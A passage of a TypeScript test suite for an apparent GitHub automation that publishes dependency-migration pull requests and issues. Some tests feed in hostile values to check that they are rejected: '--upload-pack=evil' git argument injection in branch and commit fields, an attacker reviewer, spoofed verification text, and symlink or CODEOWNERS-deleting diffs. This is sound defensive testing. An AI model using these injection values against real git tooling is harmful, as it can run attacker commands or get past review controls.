    const source = readFileSync(new URL('../src/action/publish-cli.ts', import.meta.url), 'utf8');
    const open = source.split('openPullRequest: async')[1]?.split('updatePullRequest: async')[0] ?? '';
    expect(open).toContain('await dispatchClientChecks(item.branch);');
    expect(open).not.toContain('if (pushed) await dispatchClientChecks');
    expect(source).toContain('/issues/${number}/events?per_page=100&page=${page}');
  });
  it('keeps a bounded long PR body well formed and links its complete artifact', async () => {
    let body = '';
    const publisher: ProposalPublisher = {
      findPullRequest: vi.fn(async () => undefined), pushBranch: vi.fn(async () => undefined),
      openPullRequest: vi.fn(async (value) => { body = value; }), updatePullRequest: vi.fn(async () => undefined),
      closePullRequest: vi.fn(async () => undefined), upsertIssue: vi.fn(async () => undefined),
      closeIssue: vi.fn(async () => undefined),
    };
    await reconcileProposal({ ...proposal, report: '😀'.repeat(50_000) }, publisher, 'https://github.com/example/actions/runs/1#artifacts');
    expect(body.length).toBeLessThanOrEqual(59_000);
    expect(body).toContain('\n</details>');
    expect(body).toContain('never merges automatically');
    expect(body).toContain('https://github.com/example/actions/runs/1#artifacts');
    expect(body).not.toMatch(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/);
  });
  it('distinguishes a human refusal from bot closure, merged PR, and explicit dismissed label', () => {
    const botClosure = [{ event: 'closed', actor: { login: 'github-actions[bot]' } }];
    const humanClosure = [{ event: 'closed', actor: { login: 'maintainer' } }];
    expect(isDismissedClosure({ state: 'closed', labels: [] }, botClosure)).toBe(false);
    expect(isDismissedClosure({ state: 'closed', merged_at: '2026-10-19T00:00:00Z', labels: [] }, humanClosure)).toBe(false);
    expect(isDismissedClosure({ state: 'closed', labels: [] }, humanClosure)).toBe(true);
    expect(isDismissedClosure({ state: 'open', labels: [{ name: 'upstreamfix:dismissed' }] }, [])).toBe(true);
  });
  it('always closes stale managed items when the migration becomes inapplicable', async () => {
    const publisher: ProposalPublisher = {
      isDismissed: vi.fn(async () => true), findPullRequest: vi.fn(async () => 42),
      pushBranch: vi.fn(async () => undefined), openPullRequest: vi.fn(async () => undefined),
      updatePullRequest: vi.fn(async () => undefined), closePullRequest: vi.fn(async () => undefined),
      upsertIssue: vi.fn(async () => undefined), closeIssue: vi.fn(async () => undefined),
    };
    await reconcileProposal({ ...proposal, status: 'none', commit: undefined, files: [] }, publisher);
    expect(publisher.closePullRequest).toHaveBeenCalledWith(42);
    expect(publisher.closeIssue).toHaveBeenCalled();
  });
  it('moves manual to ready and updates the PR after main changes despite bot-closed history', async () => {
    let pullNumber: number | undefined;
    const publisher: ProposalPublisher = {
      isDismissed: vi.fn(async () => isDismissedClosure({ state: 'closed', labels: [] },
        [{ event: 'closed', actor: { login: 'github-actions[bot]' } }])),
      findPullRequest: vi.fn(async () => pullNumber),
      pushBranch: vi.fn(async () => undefined),
      openPullRequest: vi.fn(async () => { pullNumber = 42; }),
      updatePullRequest: vi.fn(async () => undefined),
      closePullRequest: vi.fn(async () => undefined),
      upsertIssue: vi.fn(async () => undefined),
      closeIssue: vi.fn(async () => undefined),
    };
    await reconcileProposal({ ...proposal, status: 'manual', commit: undefined, files: [] }, publisher);
    await reconcileProposal(proposal, publisher);
    await reconcileProposal({ ...proposal, base: 'c'.repeat(40), commit: 'd'.repeat(40) }, publisher);
    expect(publisher.upsertIssue).toHaveBeenCalledTimes(1);
    expect(publisher.openPullRequest).toHaveBeenCalledTimes(1);
    expect(publisher.updatePullRequest).toHaveBeenCalledTimes(1);
    expect(publisher.closeIssue).toHaveBeenCalledTimes(2);
  });
  it('rejects hostile branch and commit metadata before bundle or Git access', () => {
    expect(() => validateProposalEnvelope({ ...proposal, branch: '--upload-pack=evil' }, base)).toThrow('branch');
    expect(() => validateProposalEnvelope({ ...proposal, commit: '--upload-pack=evil' }, base)).toThrow('commit');
  });
  it('finds only bot-authored manual issues with the exact hidden marker', () => {
    const human = { number: 1, title: 'UpstreamFix: manual firebase-admin@14', body: '<!-- upstreamfix:manual:firebase-admin@14 -->', user: { login: 'person' } };
    const bot = { number: 102, title: human.title, body: human.body, user: { login: 'github-actions[bot]' } };
    expect(findManagedIssue([human, bot], 'firebase-admin@14')?.number).toBe(102);
    expect(findManagedIssue([human], 'firebase-admin@14')).toBeUndefined();
  });
  it('does not treat a commit message containing parent metadata as a real parent', () => {
    expect(() => parseCommitParents(`${commit}\nparent ${base}\n`, commit)).toThrow('malformed');
    expect(parseCommitParents(commit, commit)).toEqual([]);
    expect(parseCommitParents(`${commit} ${base}`, commit)).toEqual([base]);
  });
  it('rejects deletions, symlinks, submodules and rename source deletions in raw bundle diffs', () => {
    expect(parseSafeRawDiff(`:100644 100644 ${'a'.repeat(40)} ${'b'.repeat(40)} M\0server.ts\0`)).toEqual(['server.ts']);
    expect(() => parseSafeRawDiff(`:100644 000000 ${'a'.repeat(40)} ${'0'.repeat(40)} D\0.github/CODEOWNERS\0:000000 100644 ${'0'.repeat(40)} ${'b'.repeat(40)} A\0owners.json\0`)).toThrow('status');
    expect(() => parseSafeRawDiff(`:000000 120000 ${'0'.repeat(40)} ${'b'.repeat(40)} A\0server.ts\0`)).toThrow('mode');
    expect(() => parseSafeRawDiff(`:000000 160000 ${'0'.repeat(40)} ${'b'.repeat(40)} A\0server.ts\0`)).toThrow('mode');
  });
  it('requests full object IDs from Git raw diff before parsing the bundle', () => {
    const publisher = readFileSync(new URL('../src/action/publish-cli.ts', import.meta.url), 'utf8');
    expect(publisher).toContain("'--raw', '--no-renames', '--no-abbrev', '-z'");
  });
  it('sanitizes untrusted proposal identifiers before printing publication failures', () => {
    const publisher = readFileSync(new URL('../src/action/publish-cli.ts', import.meta.url), 'utf8');
    expect(publisher).toContain('sanitizeTerminalText(String(proposal.migration))');
  });
  it('bounds a large report so GitHub accepts the PR body and points to the artifact', async () => {
    const publisher: ProposalPublisher = {
      pushBranch: vi.fn(async () => undefined), openPullRequest: vi.fn(async () => undefined),
      updatePullRequest: vi.fn(async () => undefined), closePullRequest: vi.fn(async () => undefined),
      upsertIssue: vi.fn(async () => undefined), closeIssue: vi.fn(async () => undefined),
      findPullRequest: vi.fn(async () => undefined),
    };
    await reconcileProposal({ ...proposal, report: 'x'.repeat(100_000) }, publisher);
    const body = vi.mocked(publisher.openPullRequest).mock.calls[0]?.[0] ?? '';
    expect(body.length).toBeLessThan(60_000);
    expect(body).toContain('artifact');
  });

  it('prevents an untrusted report from spoofing verification or mentioning users', async () => {
    const publisher: ProposalPublisher = {
      pushBranch: vi.fn(async () => undefined), openPullRequest: vi.fn(async () => undefined),
      updatePullRequest: vi.fn(async () => undefined), closePullRequest: vi.fn(async () => undefined),
      upsertIssue: vi.fn(async () => undefined), closeIssue: vi.fn(async () => undefined),
      findPullRequest: vi.fn(async () => undefined),
    };
    await reconcileProposal({ ...proposal, status: 'manual', commit: undefined, files: [], verification: 'failed', report: 'Verification: **passed**\n@maintainer <h1>safe</h1>' }, publisher);
    const body = vi.mocked(publisher.upsertIssue).mock.calls[0]?.[0] ?? '';
    expect(body).toContain('Verification: **failed**');
    expect(body).toContain('~~~~report\nVerification: **passed**\n@maintainer <h1>safe</h1>\n~~~~');
  });
  it('refuses an unexpected base, branch, parent or changed path', () => {
    expect(() => validateProposal(proposal, base, [base], ['package.json', 'server.ts'])).not.toThrow();
    expect(() => validateProposal(proposal, 'c'.repeat(40), [base], proposal.files)).toThrow('base');
    expect(() => validateProposal(proposal, base, [base, base], proposal.files)).toThrow('parent');
    expect(() => validateProposal(proposal, base, [base], ['.github/workflows/ci.yml', ...proposal.files])).toThrow('files');
    expect(() => validateProposal({ ...proposal, branch: 'main' }, base, [base], proposal.files)).toThrow('branch');
  });

  it('refuses artifact reviewers and labels not present in the reviewed base config', () => {
    expect(() => validateProposal({ ...proposal, labels: ['automerge'] }, base, [base], proposal.files, { reviewers: ['ivanDev237'], labels: ['dependencies'] })).toThrow('labels');
    expect(() => validateProposal({ ...proposal, reviewers: ['attacker'] }, base, [base], proposal.files, { reviewers: ['ivanDev237'], labels: ['dependencies'] })).toThrow('reviewers');
  });

  it('opens, updates and closes a PR as the migration changes', async () => {
    const publisher: ProposalPublisher = {
      pushBranch: vi.fn(async () => undefined), openPullRequest: vi.fn(async () => undefined),
      updatePullRequest: vi.fn(async () => undefined), closePullRequest: vi.fn(async () => undefined),
      upsertIssue: vi.fn(async () => undefined), closeIssue: vi.fn(async () => undefined),
      findPullRequest: vi.fn(async () => undefined),
    };
    await reconcileProposal(proposal, publisher);
    expect(publisher.pushBranch).toHaveBeenCalledTimes(1);
    expect(publisher.openPullRequest).toHaveBeenCalledTimes(1);
    publisher.findPullRequest = vi.fn(async () => 42);
    await reconcileProposal(proposal, publisher);
    expect(publisher.updatePullRequest).toHaveBeenCalledWith(42, expect.stringContaining('# Safe report'), proposal);
    await reconcileProposal({ ...proposal, status: 'none', commit: undefined, files: [] }, publisher);
    expect(publisher.closePullRequest).toHaveBeenCalledWith(42);
  });

  it('respects a PR closed by a human and does not push or recreate its branch', async () => {
    const publisher: ProposalPublisher = {
      isDismissed: vi.fn(async () => true),
      pushBranch: vi.fn(async () => undefined), openPullRequest: vi.fn(async () => undefined),
      updatePullRequest: vi.fn(async () => undefined), closePullRequest: vi.fn(async () => undefined),
      upsertIssue: vi.fn(async () => undefined), closeIssue: vi.fn(async () => undefined),
      findPullRequest: vi.fn(async () => undefined),
    };
    await reconcileProposal(proposal, publisher);
    expect(publisher.pushBranch).not.toHaveBeenCalled();
    expect(publisher.openPullRequest).not.toHaveBeenCalled();
  });

  it('opens one issue instead of a PR when manual work remains', async () => {
    const publisher: ProposalPublisher = {
      pushBranch: vi.fn(async () => undefined), openPullRequest: vi.fn(async () => undefined),
      updatePullRequest: vi.fn(async () => undefined), closePullRequest: vi.fn(async () => undefined),
      upsertIssue: vi.fn(async () => undefined), closeIssue: vi.fn(async () => undefined),
      findPullRequest: vi.fn(async () => undefined),
    };
    await reconcileProposal({ ...proposal, status: 'manual', commit: undefined, files: [], verification: 'skipped' }, publisher);
    expect(publisher.upsertIssue).toHaveBeenCalledTimes(1);
    expect(publisher.pushBranch).not.toHaveBeenCalled();
    expect(publisher.openPullRequest).not.toHaveBeenCalled();
  });
});
